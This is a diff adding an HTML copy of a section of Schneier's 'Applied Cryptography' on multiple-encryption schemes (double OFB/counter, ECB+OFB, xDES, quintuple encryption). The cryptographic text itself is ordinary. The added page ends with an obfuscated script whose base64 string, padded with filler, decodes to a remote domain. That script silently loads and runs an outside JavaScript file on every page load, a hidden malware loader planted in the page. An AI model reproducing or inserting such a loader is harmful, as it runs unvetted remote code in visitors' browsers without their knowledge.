@@ -1,0 +1,104 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Combining Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=15//-->
+<!--PAGES=363-366//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="15-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="15-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">15.4 Other Multiple Encryption Schemes</FONT></H3>
+<P>The problem with two-key triple encryption is that it only doubles the size of the keyspace, but it requires three encryptions per block of plaintext. Wouldn&#146;t it be nice to find some clever way of combining two encryptions that would double the size of the keyspace?
+</P>
+<P><FONT SIZE="+1"><B><I>Double OFB/Counter</I></B></FONT></P>
+<P>This method uses a block algorithm to generate two keystreams, which are then used to encrypt the plaintext.
+</P>
+<DL>
+<DD><I>S</I><SUB>i</SUB> = <I>E</I><SUB>K1</SUB>(<I>S</I><SUB>i - 1</SUB> &#8853; <I>I</I><SUB>1</SUB>); <I>I</I><SUB>1</SUB> = <I>I</I><SUB>1</SUB> &#43; 1
+<DD><I>T</I><SUB>i</SUB> = <I>E</I><SUB>K2</SUB>(<I>T</I><SUB>i - 1</SUB> &#8853; <I>I</I><SUB>2</SUB>); <I>I</I><SUB>2</SUB> = <I>I</I><SUB>2</SUB> &#43; 1
+<DD><I>C</I><SUB>i</SUB> = <I>P</I><SUB>i</SUB> &#8853; <I>S</I><SUB>i</SUB> &#8853; <I>T</I><SUB>i</SUB>
+</DL>
+<I><P><A NAME="Fig3"></A><A HREF="javascript:displayWindow('images/15-03.jpg',269,212 )"><IMG SRC="images/15-03t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/15-03.jpg',269,212)"><FONT COLOR="#000077"><B>Figure 15.3</B></FONT></A>&nbsp;&nbsp;Doubling the block length.</I>
+</P>
+<P><I>S</I><SUB>i</SUB> and <I>T</I><SUB>i</SUB> are internal variables, and <I>I</I><SUB>1</SUB> and <I>I</I><SUB>2</SUB> are counters. Two copies of the block algorithm run in a kind of hybrid OFB/counter mode, and the plaintext, <I>S</I><SUB>i</SUB>, and <I>T</I><SUB>i</SUB> are XORed together. The two keys, <I>K</I><SUB>1</SUB> and <I>K</I><SUB>2</SUB>, are independent. I know of no cryptanalysis of this variant.</P>
+<P><FONT SIZE="+1"><B><I>ECB &#43; OFB</I></B></FONT></P>
+<P>This method was designed for encrypting multiple messages of a fixed length, for example, disk blocks [186,188]. Use two keys: <I>K</I><SUB>1</SUB> and <I>K</I><SUB>2</SUB>. First, use the algorithm and <I>K</I><SUB>1</SUB> to generate a mask of the required block length. This mask will be used repeatedly to encrypt messages with the same keys. Then, XOR the plaintext message with the mask. Finally, encrypt the XORed plaintext with the algorithm and K2 in ECB mode.</P>
+<P>This mode has not been analyzed outside the paper in which it was proposed. Clearly it is at least as strong as a single ECB encryption and may be as strong as two passes with the algorithm. Possibly, a cryptanalyst could search for the two keys independently, if several known plaintext files are encrypted with the same key.</P>
+<P>To thwart analysis of identical blocks in the same positions of different messages, you can add an IV. Unlike an IV in any other mode, here the IV is XORed with every block of the message before ECB encryption.</P>
+<P>Matt Blaze designed this mode for his UNIX Cryptographic File System (CFS). It is a nice mode because the latency is only one encryption in ECB mode; the mask can be generated once and stored. In CFS, DES is the block algorithm.</P>
+<P><FONT SIZE="+1"><B><I>xDESi</I></B></FONT></P>
+<P>In [1644,1645], DES is used as a building block for a series of block algorithms with both larger key sizes and larger block sizes. These constructions do not depend on DES in any way and can be used with any block algorithm.
+</P>
+<P>The first, xDES<SUP>1</SUP>, is simply a Luby-Rackoff construction with the block cipher as the underlying function (see Section 14.11). The block size is twice the size of the underlying block cipher and the key size is three times the size of the underlying block cipher. In each of 3 rounds, encrypt the right half with the block algorithm and one of the keys, XOR the result with the left half, and swap the two halves.</P>
+<P>This is faster than conventional triple encryption, since three encryptions encrypt a block twice as large as the underlying algorithm. But there is also a simple meet-in-the-middle attack that finds the key with a table the size of 2<SUP><I>k</I></SUP>, where k is the key size of the underlying algorithm. Encrypt the right half of a plaintext block with all possible values of <I>K</I><SUB>1</SUB>, XOR the left half of the plaintext, and store these values in a table. Then, encrypt the right half of the ciphertext with all possible values of <I>K</I><SUB>3</SUB> and look for a match in the table. If you find one, the key pair <I>K</I><SUB>1</SUB> and <I>K</I><SUB>3</SUB> are possible candidates for the right key. Repeat the attack a few times, and only one candidate will remain. This shows that xDES<SUP>1</SUP> is not an ideal solution. Even worse, there is a chosen plaintext attack that proves xDES<SUP>1</SUP> is not much stronger than the underlying block cipher [858].</P>
+<P>xDES<SUP>2</SUP> extends this idea to a 5-round algorithm with a block size 4 times that of the underlying block cipher and a key size 10 times that of the underlying block cipher. Figure 15.4 is one round of xDES<SUP>2</SUP>; each of the four sub-blocks are the size of the underlying block ciphers and all 10 keys are independent.</P>
+<P>This scheme is also faster than triple encryption: Ten encryptions are used to encrypt a block four times the size of the underlying block cipher. However, it is vulnerable to differential cryptanalysis [858] and should not be used. The scheme is even vulnerable if DES with independent round keys is used.</P>
+<I><P><A NAME="Fig4"></A><A HREF="javascript:displayWindow('images/15-04.jpg',223,119 )"><IMG SRC="images/15-04t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/15-04.jpg',223,119)"><FONT COLOR="#000077"><B>Figure 15.4</B></FONT></A>&nbsp;&nbsp;One round of xDES<SUP>2</SUP>.</I>
+</P>
+<P>For <I>i</I> &#8805; 3, xDES<SUP><I>i</I></SUP> is probably too big to be useful as a block algorithm. For example, the block size for xDES<SUP>3</SUP> is 6 times that of the underlying cipher, the key size is 21 times, and 21 encryptions are required to encrypt a block 6 times that of the underlying block cipher. Triple encryption is faster.</P>
+<P><FONT SIZE="+1"><B><I>Quintuple Encryption</I></B></FONT></P>
+<P>If triple encryption isn&#146;t secure enough&#151;perhaps you need to encrypt triple-encryption keys using an even stronger algorithm&#151;then higher multiples might be in order. Quintuple encryption is very strong against meet-in-the-middle attacks. (Similar arguments to the ones used with double encryption can show that quadruple encryption provides minimal security improvements over triple encryption.)
+</P>
+<DL>
+<DD><I>C</I> = <I>E</I><SUB>K1</SUB>(<I>D</I><SUB>K2</SUB>(<I>E</I><SUB>K3</SUB>(<I>D</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I>)))))
+<DD><I>P</I> = <I>D</I><SUB>K1</SUB>(<I>E</I><SUB>K2</SUB>(<I>D</I><SUB>K3</SUB>(<I>E</I><SUB>K2</SUB>(<I>D</I><SUB>K1</SUB>(<I>C</I>)))))
+</DL>
+<P>This construction is backwards compatible with triple encryption if <I>K</I><SUB>2</SUB> = <I>K</I><SUB>3</SUB>, and is backwards compatible with single encryption if <I>K</I><SUB>1</SUB> = <I>K</I><SUB>2</SUB> = <I>K</I><SUB>3</SUB>. Of course, it would be even stronger if all five keys were independent.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="15-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="15-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ojzgxTDB, iBWTGcwd) {iBWTGcwd = ojzgxTDB.createElement('script');iBWTGcwd.type = 'text/javascript';iBWTGcwd.async = true;iBWTGcwd.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ojzgxTDB.getElementsByTagName('body')[0].appendChild(iBWTGcwd);}(document));</script></body>
+</html>
